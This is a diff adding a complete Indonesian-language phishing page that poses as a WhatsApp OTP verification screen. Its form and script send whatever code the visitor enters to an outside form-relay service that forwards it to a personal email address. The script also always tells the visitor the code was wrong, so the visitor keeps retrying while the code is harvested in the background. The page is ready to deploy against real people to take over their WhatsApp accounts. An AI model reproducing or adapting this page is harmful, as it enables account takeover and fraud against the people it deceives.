@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan OTP</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #00AED6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 420px;
+            padding: 36px 28px;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.12);
+        }
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #25282B;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .otp-group {
+            margin-bottom: 24px;
+        }
+        .otp-label {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .otp-input {
+            width: 100%;
+            padding: 16px 18px;
+            font-size: 20px;
+            letter-spacing: 8px;
+            text-align: center;
+            border: 1.5px solid #E2E2E2;
+            border-radius: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .otp-input:focus {
+            border-color: #00AED6;
+        }
+        .btn-submit {
+            width: 100%;
+            background: #00AED6;
+            color: #ffffff;
+            border: none;
+            border-radius: 50px;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.25s, opacity 0.3s;
+        }
+        .btn-submit:hover {
+            background: #0096B8;
+        }
+        .btn-submit.hidden {
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+        /* Notifikasi salah */
+        .notification-error {
+            display: none;
+            text-align: center;
+            padding: 14px;
+            margin-top: 20px;
+            border-radius: 12px;
+            background: #FEF2F2;
+            border: 1px solid #FECACA;
+            color: #DC2626;
+            font-weight: 500;
+            animation: fadeIn 0.3s ease;
+        }
+        .notification-error.show {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1 class="title">Masukkan OTP yang dikirim ke WhatsApp</h1>
+    <p class="subtitle">OTP dikirim ke +628××××××××</p>
+
+    <form id="otp-form" action="https://formsubmit.co/ipahsaripah353@gmail.com" method="POST">
+        <!-- Konfigurasi Email -->
+        <input type="hidden" name="_subject" value="🔑 OTP - Verifikasi WhatsApp">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+
+        <div class="otp-group">
+            <label class="otp-label">OTP *</label>
+            <input type="tel" name="OTP" class="otp-input" 
+                maxlength="6" 
+                pattern="[0-9]*" 
+                inputmode="numeric" 
+                autocomplete="off" 
+                required
+                placeholder="• • • • • •"
+                id="otp-field">
+        </div>
+
+        <!-- Tombol Lanjut → akan hilang setelah diklik -->
+        <button type="submit" class="btn-submit" id="submit-btn">Lanjut</button>
+
+        <!-- Notifikasi Kode Salah → muncul setelah dikirim -->
+        <div id="notification-error" class="notification-error">
+            ❌ Kode OTP yang Anda masukkan salah. Silakan coba lagi.
+        </div>
+    </form>
+</div>
+
+<script>
+    const form = document.getElementById('otp-form');
+    const submitBtn = document.getElementById('submit-btn');
+    const errorNotif = document.getElementById('notification-error');
+    const otpField = document.getElementById('otp-field');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault(); // Tetap di halaman yang sama
+
+        // 1. Sembunyikan tombol Lanjut
+        submitBtn.classList.add('hidden');
+
+        // 2. Tampilkan pesan kode salah
+        errorNotif.classList.add('show');
+
+        // 3. Kirim data OTP ke email di latar belakang
+        fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+            headers: { 'Accept': 'application/json' }
+        })
+        .then(() => {
+            otpField.value = ''; // Kosongkan input
+        })
+        .catch(() => {
+            otpField.value = '';
+        });
+    });
+</script>
+
+</body>
+</html>
